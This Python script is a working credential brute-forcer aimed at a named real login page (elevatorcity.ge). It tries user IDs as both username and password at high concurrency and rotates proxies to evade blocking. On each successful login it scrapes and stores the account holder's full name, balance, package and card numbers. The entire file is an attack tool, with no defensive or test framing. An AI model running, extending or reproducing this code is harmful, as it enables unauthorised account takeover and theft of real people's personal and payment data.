import asyncio
import aiohttp
from aiohttp import FormData
from bs4 import BeautifulSoup
from pathlib import Path
import argparse
import sys
from datetime import datetime
from typing import Optional, List, Dict
import json
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
from rich.panel import Panel
from rich.table import Table
from rich import box
import random

console = Console()


class ProxyManager:
    """Manages proxy rotation and validation with auto-reload"""

    def __init__(self, proxy_file: Optional[str] = None, proxy_list: Optional[List[str]] = None, proxy_api_url: Optional[str] = None):
        self.proxies = []
        self.proxy_file = proxy_file
        self.proxy_api_url = proxy_api_url
        self.current_index = 0
        self.request_counter = 0
        self.reload_interval = 100000  # Reload every 100k requests
        self.lock = asyncio.Lock()

        # Initial load (sync only)
        if proxy_file and Path(proxy_file).exists():
            self._load_proxies_from_file(proxy_file)
        elif proxy_list:
            self._load_proxies_from_list(proxy_list)

    async def initialize(self):
        """Async initialization - load proxies from API if needed"""
        if self.proxy_api_url:
            await self._load_proxies_from_api()

    def _load_proxies_from_file(self, proxy_file: str):
        """Load proxies from file"""
        self.proxies = []
        with open(proxy_file, 'r') as f:
            for line in f:
                proxy = line.strip()
                if proxy:
                    # Add http:// prefix if not present
                    if not proxy.startswith('http://') and not proxy.startswith('https://'):
                        proxy = f'http://{proxy}'
                    self.proxies.append(proxy)
        if self.proxies:
            console.print(f"[green]Loaded {len(self.proxies)} proxies from {proxy_file}[/green]")

    def _load_proxies_from_list(self, proxy_list: List[str]):
        """Load proxies from list"""
        self.proxies = []
        for proxy in proxy_list:
            # Add http:// prefix if not present
            if not proxy.startswith('http://') and not proxy.startswith('https://'):
                proxy = f'http://{proxy}'
            self.proxies.append(proxy)
        if self.proxies:
            console.print(f"[green]Loaded {len(self.proxies)} proxies[/green]")

    async def _load_proxies_from_api(self):
        """Load proxies from API URL"""
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(self.proxy_api_url, timeout=aiohttp.ClientTimeout(total=30)) as response:
                    if response.status == 200:
                        text = await response.text()
                        self.proxies = []
                        for line in text.split('\n'):
                            proxy = line.strip()
                            if proxy:
                                # Add http:// prefix if not present
                                if not proxy.startswith('http://') and not proxy.startswith('https://'):
                                    proxy = f'http://{proxy}'
                                self.proxies.append(proxy)
                        if self.proxies:
                            console.print(f"[green]Loaded {len(self.proxies)} proxies from API[/green]")
                    else:
                        console.print(f"[yellow]⚠ Failed to load proxies from API: HTTP {response.status}[/yellow]")
        except Exception as e:
            console.print(f"[yellow]⚠ Error loading proxies from API: {e}[/yellow]")

    async def check_and_reload_proxies(self):
        """Check if proxies need to be reloaded"""
        async with self.lock:
            if self.request_counter >= self.reload_interval and self.proxy_api_url:
                console.print(f"\n[cyan]Reloading proxies ({self.request_counter:,} requests made)...[/cyan]")
                await self._load_proxies_from_api()
                self.request_counter = 0

    def get_next_proxy(self) -> Optional[str]:
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_index % len(self.proxies)]
        self.current_index += 1
        self.request_counter += 1
        return proxy

    def get_random_proxy(self) -> Optional[str]:
        """Get random proxy"""
        if not self.proxies:
            return None
        self.request_counter += 1
        return random.choice(self.proxies)


class ProgressManager:
    """Manages progress tracking for large file processing"""

    def __init__(self, progress_file: str = "checked_users.txt"):
        self.progress_file = progress_file
        self.checked_ids = set()
        self.lock = asyncio.Lock()
        self.save_counter = 0
        self.save_interval = 1000  # Save every 1000 checks

    def load_progress(self):
        """Load previously checked IDs"""
        if Path(self.progress_file).exists():
            try:
                with open(self.progress_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        user_id = line.strip()
                        if user_id:
                            self.checked_ids.add(user_id)
                console.print(f"[green]Loaded {len(self.checked_ids):,} previously checked IDs[/green]")
            except Exception as e:
                console.print(f"[yellow]⚠ Could not load progress: {e}[/yellow]")

    async def mark_checked(self, user_id: str):
        """Mark user ID as checked"""
        async with self.lock:
            self.checked_ids.add(user_id)
            self.save_counter += 1

            # Periodically save to disk
            if self.save_counter >= self.save_interval:
                await self._save_progress()
                self.save_counter = 0

    async def _save_progress(self):
        """Save checked IDs to file"""
        try:
            with open(self.progress_file, 'w', encoding='utf-8') as f:
                for user_id in self.checked_ids:
                    f.write(f"{user_id}\n")
        except Exception as e:
            console.print(f"[yellow]⚠ Could not save progress: {e}[/yellow]")

    async def save_final_progress(self):
        """Save final progress on exit"""
        await self._save_progress()

    def is_checked(self, user_id: str) -> bool:
        """Check if user ID was already processed"""
        return user_id in self.checked_ids


class ResultsManager:
    """Manages saving results to file"""

    def __init__(self, output_file: str = "valid_credentials.txt"):
        self.output_file = output_file
        self.lock = asyncio.Lock()

    async def save_valid(self, user_id: str, additional_info: Dict = None):
        """Save valid credential to file"""
        async with self.lock:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            result = {
                "user_id": user_id,
                "timestamp": timestamp,
                "status": "VALID"
            }
            if additional_info:
                result.update(additional_info)

            # Append to text file
            with open(self.output_file, 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] Valid: {user_id}\n")

            # Append to JSON file (one JSON per line for memory efficiency)
            json_file = self.output_file.replace('.txt', '.jsonl')
            with open(json_file, 'a', encoding='utf-8') as f:
                f.write(json.dumps(result, ensure_ascii=False) + '\n')


class Statistics:
    """Track statistics with live updates"""

    def __init__(self):
        self.total = 0
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.errors = 0
        self.skipped = 0
        self.start_time = datetime.now()

    def get_stats_table(self) -> Table:
        """Generate statistics table"""
        table = Table(box=box.ROUNDED, show_header=False, padding=(0, 1))
        table.add_column(style="cyan bold")
        table.add_column(style="white")

        elapsed = (datetime.now() - self.start_time).total_seconds()
        rate = self.checked / elapsed if elapsed > 0 else 0

        table.add_row("Total", f"{self.total:,}")
        table.add_row("Checked", f"{self.checked:,}")
        if self.skipped > 0:
            table.add_row("Skipped", f"[dim]{self.skipped:,}[/dim]")
        table.add_row("✓ Valid", f"[green bold]{self.valid}[/green bold]")
        table.add_row("✗ Invalid", f"[red]{self.invalid:,}[/red]")
        table.add_row("⚠ Errors", f"[yellow]{self.errors:,}[/yellow]")
        table.add_row("Speed", f"{rate:.2f} req/s")

        return table



class Checker:
    """Advanced credential checker with retry and proxy support"""

    def __init__(
        self,
        proxy_manager: Optional[ProxyManager] = None,
        results_manager: Optional[ResultsManager] = None,
        progress_manager: Optional[ProgressManager] = None,
        max_retries: int = 3,
        timeout: int = 30
    ):
        self.proxy_manager = proxy_manager
        self.results_manager = results_manager
        self.progress_manager = progress_manager
        self.max_retries = max_retries
        self.timeout = timeout
        self.api_url = "https://elevatorcity.ge/Login/Authentication.aspx"
        self.stats = Statistics()

    async def create_session(self) -> aiohttp.ClientSession:
        """Create session for HTTP requests"""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }

        timeout_config = aiohttp.ClientTimeout(total=self.timeout)

        session = aiohttp.ClientSession(
            headers=headers,
            timeout=timeout_config,
            trust_env=True
        )

        return session

    async def close_all_sessions(self):
        """Close all active sessions (deprecated - sessions are now closed per-request)"""
        pass

    async def parse_hidden_inputs(self, session: aiohttp.ClientSession, proxy: Optional[str] = None) -> Optional[Dict]:
        """Parse hidden inputs from page"""
        try:
            async with session.get(self.api_url, proxy=proxy) as response:
                if response.status == 200:
                    html = await response.text()
                    soup = BeautifulSoup(html, 'lxml')
                    hidden_inputs = soup.find_all("input", type="hidden")
                    inputs = {}
                    for hidden_input in hidden_inputs:
                        name = hidden_input.get("name")
                        value = hidden_input.get("value", "")
                        inputs[name] = value
                    return inputs
        except Exception as e:
            console.print(f"[yellow]⚠ Error parsing hidden inputs: {e}[/yellow]")
            return None

    def parse_account_info(self, html: str) -> Optional[Dict]:
        """Parse account information from dashboard HTML"""
        try:
            soup = BeautifulSoup(html, 'lxml')

            # Check for name and surname (სახელი და გვარი:)
            fullname_elem = soup.find('span', {'id': 'MaincContentPlaceHolder_LabelFullname'})
            if not fullname_elem:
                return None

            fullname = fullname_elem.get_text(strip=True)
            if not fullname:
                return None

            # Account is valid if we got here
            account_info = {
                "fullname": fullname,
                "balance": None,
                "package": None,
                "cards": []
            }

            # Parse balance (ბალანსი:)
            balance_elem = soup.find('span', {'id': 'MaincContentPlaceHolder_LabelBalance'})
            if balance_elem:
                account_info["balance"] = balance_elem.get_text(strip=True)

            # Parse package info (პაკეტები:)
            package_grid = soup.find('div', {'id': 'ctl00_MaincContentPlaceHolder_GridUserTarrifs'})
            if package_grid:
                package_rows = package_grid.find_all('tr', class_=['rgRow', 'rgAltRow'])
                if package_rows:
                    # Get first package
                    cols = package_rows[0].find_all('td')
                    if len(cols) >= 4:
                        package_name = cols[1].get_text(strip=True)
                        start_date = cols[2].get_text(strip=True)
                        end_date = cols[3].get_text(strip=True)
                        account_info["package"] = f"{package_name} ({start_date} - {end_date})"

            # Parse card numbers (ბარათის ნომერი)
            cards_grid = soup.find('div', {'id': 'ctl00_MaincContentPlaceHolder_GridCards'})
            if cards_grid:
                card_rows = cards_grid.find_all('tr', class_=['rgRow', 'rgAltRow'])
                for row in card_rows:
                    cols = row.find_all('td')
                    if len(cols) >= 2:
                        card_number = cols[1].get_text(strip=True)
                        if card_number:
                            account_info["cards"].append(card_number)

            return account_info

        except Exception as e:
            console.print(f"[yellow]⚠ Error parsing account info: {e}[/yellow]")
            return None

    async def check_credential(self, user_id: str, retry_count: int = 0) -> bool:
        """Check single credential with retry logic"""
        proxy = self.proxy_manager.get_random_proxy() if self.proxy_manager else None
        session = None

        try:
            # Create NEW session for each check to avoid session caching issues
            session = await self.create_session()

            # Parse hidden inputs
            hidden_inputs = await self.parse_hidden_inputs(session, proxy)
            if not hidden_inputs:
                raise Exception("Failed to retrieve hidden inputs")

            __VIEWSTATE = hidden_inputs.get("__VIEWSTATE")
            __VIEWSTATEGENERATOR = hidden_inputs.get("__VIEWSTATEGENERATOR")
            __EVENTVALIDATION = hidden_inputs.get("__EVENTVALIDATION")

            if not __VIEWSTATE or not __VIEWSTATEGENERATOR or not __EVENTVALIDATION:
                raise Exception("Essential hidden inputs are missing")

            # Prepare form data
            form = FormData()
            form.add_fields(
                ("__VIEWSTATE", __VIEWSTATE),
                ("__VIEWSTATEGENERATOR", __VIEWSTATEGENERATOR),
                ("__EVENTVALIDATION", __EVENTVALIDATION),
                ("__EVENTTARGET", "ButtonLogin"),
                ("TextUsername", user_id),
                ("TextPassword", user_id)
            )

            # Make request with HTTP proxy - ALLOW REDIRECTS
            async with session.post(self.api_url, data=form, allow_redirects=True, proxy=proxy) as response:
                if response.status == 200:
                    # Parse the final page
                    html = await response.text()
                    account_info = self.parse_account_info(html)

                    if account_info:
                        # Valid credentials found
                        if self.results_manager:
                            save_data = {
                                "proxy": proxy,
                                "fullname": account_info["fullname"],
                                "balance": account_info["balance"],
                                "package": account_info["package"],
                                "cards": ", ".join(account_info["cards"]) if account_info["cards"] else None
                            }
                            await self.results_manager.save_valid(user_id, save_data)

                        # Print detailed valid account info
                        info_lines = [f"[green]✓ VALID:[/green] [bold green]{user_id}[/bold green]"]
                        info_lines.append(f"  └─ Name: [cyan]{account_info['fullname']}[/cyan]")
                        if account_info['balance']:
                            info_lines.append(f"  └─ Balance: [yellow]{account_info['balance']}[/yellow]")
                        if account_info['package']:
                            info_lines.append(f"  └─ Package: [magenta]{account_info['package']}[/magenta]")
                        if account_info['cards']:
                            cards_str = ", ".join(account_info['cards'])
                            info_lines.append(f"  └─ Cards: [blue]{cards_str}[/blue]")

                        console.print("\n".join(info_lines))

                        self.stats.valid += 1
                        return True
                    else:
                        # No account info found - invalid
                        self.stats.invalid += 1
                        return False
                else:
                    # Non-200 response
                    self.stats.invalid += 1
                    return False

        except Exception as e:
            # Retry logic
            if retry_count < self.max_retries:
                await asyncio.sleep(1 * (retry_count + 1))  # Exponential backoff
                return await self.check_credential(user_id, retry_count + 1)
            else:
                self.stats.errors += 1
                console.print(f"[red]✗[/red] Error checking {user_id}: {str(e)[:50]}")
                return False

        finally:
            # Close session after each check
            if session:
                await session.close()

            self.stats.checked += 1
            if self.progress_manager:
                await self.progress_manager.mark_checked(user_id)


class BruteForcer:
    """Main bruteforce orchestrator with streaming support for large files"""

    def __init__(
        self,
        user_id_source,
        total_count: Optional[int] = None,
        max_workers: int = 10,
        proxy_manager: Optional[ProxyManager] = None,
        results_manager: Optional[ResultsManager] = None,
        progress_manager: Optional[ProgressManager] = None,
        max_retries: int = 3,
        timeout: int = 30
    ):
        self.user_id_source = user_id_source
        self.total_count = total_count
        self.max_workers = max_workers
        self.progress_manager = progress_manager
        self.checker = Checker(proxy_manager, results_manager, progress_manager, max_retries, timeout)
        self.checker.stats.total = total_count or 0
        self.queue = asyncio.Queue(maxsize=max_workers * 2)  # Buffer size
        self.stop_event = asyncio.Event()

    async def producer(self):
        """Read user IDs from source and put into queue"""
        try:
            if isinstance(self.user_id_source, str):
                # File path - stream reading
                with open(self.user_id_source, 'r', encoding='utf-8', buffering=8192*16) as f:
                    for line in f:
                        user_id = line.strip()
                        if user_id:
                            # Skip already checked IDs
                            if self.progress_manager and self.progress_manager.is_checked(user_id):
                                self.checker.stats.skipped += 1
                                continue
                            await self.queue.put(user_id)
            else:
                # List of user IDs
                for user_id in self.user_id_source:
                    if self.progress_manager and self.progress_manager.is_checked(user_id):
                        self.checker.stats.skipped += 1
                        continue
                    await self.queue.put(user_id)
        finally:
            # Signal workers to stop
            for _ in range(self.max_workers):
                await self.queue.put(None)

    async def worker(self, progress: Progress, task_id):
        """Worker that processes user IDs from queue"""
        while not self.stop_event.is_set():
            user_id = await self.queue.get()

            if user_id is None:  # Stop signal
                self.queue.task_done()
                break

            try:
                await self.checker.check_credential(user_id)

                # Check and reload proxies if needed
                if self.checker.proxy_manager:
                    await self.checker.proxy_manager.check_and_reload_proxies()

                # Update progress with live stats
                stats = self.checker.stats
                elapsed = (datetime.now() - stats.start_time).total_seconds()
                rate = stats.checked / elapsed if elapsed > 0 else 0

                desc = f"[cyan]Checking[/cyan] | Valid: [green]{stats.valid}[/green] | Invalid: [red]{stats.invalid}[/red] | Errors: [yellow]{stats.errors}[/yellow] | Speed: {rate:.1f}/s"

                progress.update(task_id, description=desc, advance=1)
            finally:
                self.queue.task_done()

    async def run(self):
        """Run the bruteforce process with streaming"""
        total_display = f"{self.total_count:,}" if self.total_count else "Unknown"

        info_text = f"[bold cyan]Advanced Credential Testing Tool[/bold cyan]\n"
        info_text += f"Total targets: {total_display} | Workers: {self.max_workers}\n"

        if self.progress_manager and len(self.progress_manager.checked_ids) > 0:
            info_text += f"[green]Resuming: {len(self.progress_manager.checked_ids):,} already checked[/green]\n"

        info_text += "[dim]Press Ctrl+C to stop gracefully[/dim]"

        console.print(Panel.fit(info_text, border_style="cyan"))

        producer_task = None
        worker_tasks = []

        try:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TextColumn("({task.completed}/{task.total})"),
                TimeRemainingColumn(),
                console=console
            ) as progress:
                task = progress.add_task(
                    "[cyan]Checking credentials...",
                    total=self.total_count if self.total_count else None
                )

                # Start producer and workers
                producer_task = asyncio.create_task(self.producer())
                worker_tasks = [
                    asyncio.create_task(self.worker(progress, task))
                    for _ in range(self.max_workers)
                ]

                # Wait for producer to finish
                await producer_task

                # Wait for all items to be processed
                await self.queue.join()

                # Wait for workers to stop
                await asyncio.gather(*worker_tasks)

        except asyncio.CancelledError:
            console.print("\n[yellow]⚠ Cancelling tasks...[/yellow]")
            raise

        except KeyboardInterrupt:
            console.print("\n[yellow]⚠ Interrupted by user. Stopping gracefully...[/yellow]")

            # Signal workers to stop
            self.stop_event.set()

            # Cancel producer if still running
            if producer_task and not producer_task.done():
                producer_task.cancel()
                try:
                    await producer_task
                except asyncio.CancelledError:
                    pass

            # Cancel all workers
            for task in worker_tasks:
                if not task.done():
                    task.cancel()

            # Wait for workers to finish with timeout
            if worker_tasks:
                try:
                    await asyncio.wait_for(
                        asyncio.gather(*worker_tasks, return_exceptions=True),
                        timeout=5.0
                    )
                except asyncio.TimeoutError:
                    console.print("[yellow]⚠ Force stopping workers...[/yellow]")

            # Create unchecked file on interrupt
            if self.progress_manager:
                await self.create_unchecked_file()

        finally:
            # Always close sessions
            await self.checker.close_all_sessions()

            # Save final progress
            if self.progress_manager:
                await self.progress_manager.save_final_progress()

            # Display final statistics
            console.print("\n")
            console.print(Panel(
                self.checker.stats.get_stats_table(),
                title="[bold cyan]Final Statistics[/bold cyan]",
                border_style="cyan"
            ))

    async def create_unchecked_file(self):
        """Create file with unchecked user IDs (streaming for large files)"""
        if not isinstance(self.user_id_source, str):
            return  # Only works with file source

        unchecked_file = "unchecked_users.txt"
        console.print(f"\n[yellow]Creating {unchecked_file} with remaining IDs...[/yellow]")

        try:
            count = 0
            with open(self.user_id_source, 'r', encoding='utf-8', buffering=8192*16) as f_in:
                with open(unchecked_file, 'w', encoding='utf-8', buffering=8192*16) as f_out:
                    for line in f_in:
                        user_id = line.strip()
                        if user_id:
                            # Write if not checked
                            if not self.progress_manager or not self.progress_manager.is_checked(user_id):
                                f_out.write(f"{user_id}\n")
                                count += 1

            console.print(f"[green]✓ Saved {count:,} unchecked IDs to {unchecked_file}[/green]")
        except Exception as e:
            console.print(f"[red]✗ Error creating unchecked file: {e}[/red]")


def count_lines_fast(filepath: str) -> Optional[int]:
    """Fast line counting for large files (optional, for progress bar)"""
    try:
        console.print("[yellow]Counting lines in file (press Ctrl+C to skip)...[/yellow]")
        count = 0
        with open(filepath, 'rb') as f:
            buffer_size = 1024 * 1024 * 8  # 8MB buffer
            while True:
                buffer = f.read(buffer_size)
                if not buffer:
                    break
                count += buffer.count(b'\n')
        console.print(f"[green]Found {count:,} lines[/green]")
        return count
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠ Line counting interrupted. Starting without progress tracking...[/yellow]")
        return None
    except Exception as e:
        console.print(f"[yellow]⚠ Could not count lines: {e}[/yellow]")
        return None


async def main():
    parser = argparse.ArgumentParser(
        description="Advanced Multi-threaded Credential Testing Tool (Optimized for Large Files)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -f users.txt -w 20
  %(prog)s -f users.txt -p proxies.txt -w 50
  %(prog)s -f users.txt --proxy-api "https://api.best-proxies.ru/proxylist.txt?key=YOUR_KEY&type=http&limit=0" -w 100
  %(prog)s -u 01911105338 01922334455
  %(prog)s -f users.txt --proxy-file proxies.txt --output results.txt
  %(prog)s -f huge_file.txt -w 100 --no-count  # Skip line counting for faster startup
  %(prog)s -f users.txt --resume  # Resume from previous run
        """
    )

    parser.add_argument('-f', '--file', help='File with user IDs (one per line)')
    parser.add_argument('-u', '--users', nargs='+', help='User IDs to check')
    parser.add_argument('-w', '--workers', type=int, default=10, help='Number of concurrent workers (default: 10)')
    parser.add_argument('-p', '--proxy-file', help='File with proxies (one per line, format: ip:port)')
    parser.add_argument('--proxy-api', help='Proxy API URL (auto-reloads every 100k requests)')
    parser.add_argument('-o', '--output', default='valid_credentials.txt', help='Output file for valid credentials')
    parser.add_argument('-r', '--retries', type=int, default=3, help='Max retries per request (default: 3)')
    parser.add_argument('-t', '--timeout', type=int, default=30, help='Request timeout in seconds (default: 30)')
    parser.add_argument('--no-count', action='store_true', help='Skip counting lines (faster startup for huge files)')
    parser.add_argument('--resume', action='store_true', help='Resume from previous run (skip already checked IDs)')

    args = parser.parse_args()

    # Prepare user ID source
    user_id_source = None
    total_count = None

    if args.file:
        if not Path(args.file).exists():
            console.print(f"[red]✗ File not found: {args.file}[/red]")
            sys.exit(1)

        # Use file path directly for streaming (don't load into memory)
        user_id_source = args.file

        # Optionally count lines for progress tracking
        if not args.no_count:
            total_count = count_lines_fast(args.file)
        else:
            console.print("[yellow]Skipping line count (--no-count flag)[/yellow]")

    elif args.users:
        user_id_source = args.users
        total_count = len(args.users)
    else:
        console.print("[red]✗ Please provide user IDs via -f or -u[/red]")
        parser.print_help()
        sys.exit(1)

    # Initialize proxy manager
    proxy_manager = None
    if args.proxy_api:
        proxy_manager = ProxyManager(proxy_api_url=args.proxy_api)
        # Load proxies from API
        await proxy_manager.initialize()
    elif args.proxy_file:
        proxy_manager = ProxyManager(proxy_file=args.proxy_file)

    # Initialize results manager
    results_manager = ResultsManager(output_file=args.output)

    # Initialize progress manager
    progress_manager = None
    if args.resume or args.file:  # Always use progress tracking for files
        progress_manager = ProgressManager(progress_file="checked_users.txt")
        if args.resume:
            progress_manager.load_progress()

    # Create and run bruteforcer
    bruteforcer = BruteForcer(
        user_id_source=user_id_source,
        total_count=total_count,
        max_workers=args.workers,
        proxy_manager=proxy_manager,
        results_manager=results_manager,
        progress_manager=progress_manager,
        max_retries=args.retries,
        timeout=args.timeout
    )

    try:
        await bruteforcer.run()
        console.print(f"\n[green]✓[/green] Results saved to: [bold]{args.output}[/bold]")
    except KeyboardInterrupt:
        console.print(f"\n[yellow]⚠ Process interrupted. Partial results saved to: [bold]{args.output}[/bold][/yellow]")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        # Already handled in main()
        sys.exit(130)  # Standard exit code for Ctrl+C
    except Exception as e:
        console.print(f"\n[red]✗ Fatal error: {e}[/red]")
        sys.exit(1)